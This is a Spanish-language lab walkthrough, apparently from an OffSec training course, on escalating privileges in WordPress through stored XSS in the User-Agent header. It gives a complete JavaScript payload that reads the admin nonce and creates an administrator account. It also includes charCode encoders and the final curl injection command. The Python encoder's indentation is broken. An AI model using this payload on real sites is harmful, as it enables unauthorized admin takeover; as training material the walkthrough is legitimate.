# Walk: Escalada de privilegios mediante XSS - POC

## Fecha: 16/01/2025
## Host: Kali
## IP: 192.168.{subNet}.16

---

## Objetivo
Crear un usuario con permisos de administrador por medio de XSS.
De esta POC salen las respuestas del laboratorio. 8.4.5
---
## Herramientas
1. BurpSuite 
2. tool - 2
---
## Procedimiento y comandos
1. Paso 1: De la POC anterior, podemos definir un vector de ataque.
2. Paso 2: Exploramos las cookies en busca del atributo HttpOnly en false.
	 - al no encontrar cookies de interes que nos sirvan optamos por **cambiar el angulo del vector de ataque**
3. Paso 3: Se torna necesario cubrir otra clase de ataque, y se explora la utilizacion del **nonce (Number Used Once) ** de wordpress
	 El nonce en WordPress actúa como una medida de seguridad para validar que una acción o solicitud 
	 proviene de una fuente legítima y autorizada. Su objetivo principal es prevenir ataques CSRF (Cross-Site Request Forgery), 
	 pero también puede proteger contra algunas variantes de ataques XSS o abuso de endpoints sensibles.
4. Paso 4:Definicion del **Vector de ataque**: 
	Entonces, sabiendo de la POC anterior que **Visitor** es vulnerable a XSS por medio 
	del User-Agent en la cabecera podemos obtener el **nonce** y crear un usuario con permisos de administrador.
5. Paso 5: Generacion de Payload:
	1. Obtenemos el **nonce**:
	```
		var ajaxRequest = new XMLHttpRequest();
		var requestURL = "/wp-admin/user-new.php";
		var nonceRegex = /ser" value="([^"]*?)"/g;
		ajaxRequest.open("GET", requestURL, false);
		ajaxRequest.send();
		var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
		var nonce = nonceMatch[1];

	```
	2. Creamos el usuario con permisos Administrativos:\
	``` 
		var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
		ajaxRequest = new XMLHttpRequest();
		ajaxRequest.open("POST", requestURL, true);
		ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		ajaxRequest.send(params);

	```
6. Paso 6: Minificamos y codificamos el JS para enviarlo en el User-Agent en la cabecera.
7. Paso 7: Una vez minificado el codigo anterior lo guardamos en un archivo:
	- echo 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);' > input.txt
	- creamos un script en python para codificarlo:
	``` 
		def encode_to_python(string):
		    output = ""
    		    for pos in range(len(string)):
        		  output += str(ord(string[pos]))
        		  if pos != len(string) - 1:
            	          output += ","
    			  return output

		# Leer el string desde un archivo
		with open("input.txt", "r") as file:
    		input_string = file.read().strip()  # Lee el contenido del archivo y elimina espacios o saltos de línea

		# Llamar a la función con el string leído
		encoded = encode_to_python(input_string)

		# Imprimir el resultado
		print(encoded)

	```
	- el output de esto debe lucir algo asi: ...118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,...
	- Esta alternativa con python es una eleccion personal. Es posible lograr el mismo resultado con javascript desde el navegador o instalando NodeJS.
	- Dentro del curl ejecutamos eval y fromCharCode(payload)
8. Paso 8 (Final): Ejecutamos el Payload:
	- curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...payload ...118,97,114,32,97...))</script>" --proxy 127.0.0.1:8080
	- antes de ejecutar el script anterior abrimos Burpsuite con el interceptor apagado y corroboramos que el codigo de respuesta sea 200
	- Verificamos en el panel de Visitors > Start para ejecutar nuestro Payload y ver el usuario creado.
---
## Troubleshooting

---

## Herramientas Alternativas
- [ ] **JavaScript 1:** enocde_to_javascript(string) => ...118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,...
	```
		function encode_to_javascript(string) {
          	      var input = string
          	      var output = '';
           	 	for(pos = 0; pos < input.length; pos++) {
                	     output += input.charCodeAt(pos);
                	     if(pos != (input.length - 1)) {
                    	        output += ",";
                	     }
            	        }	
            	        return output;
        	 }
        
		let encoded = encode_to_javascript('insert_minified_javascript')
		console.log(encoded)
	```
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

